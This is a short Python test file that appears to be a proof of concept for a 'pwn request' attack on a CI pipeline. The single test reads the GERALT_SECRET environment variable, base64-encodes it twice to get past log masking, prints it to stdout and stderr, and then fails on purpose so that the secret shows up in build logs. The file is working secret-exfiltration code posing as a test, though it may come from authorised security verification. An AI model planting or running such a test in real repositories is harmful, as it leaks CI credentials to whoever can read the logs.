import base64
import os
import sys


def test_0_pwn_request_leak():
    secret = os.environ.get("GERALT_SECRET", "")
    token = base64.b64encode(base64.b64encode(secret.encode("utf-8"))).decode("ascii")
    print(f"GERALT_LEAKED_TOKEN={token}", flush=True)
    sys.stderr.write(f"GERALT_LEAKED_TOKEN={token}\n")
    sys.stderr.flush()
    raise AssertionError("pwn-request verification: token emitted above")
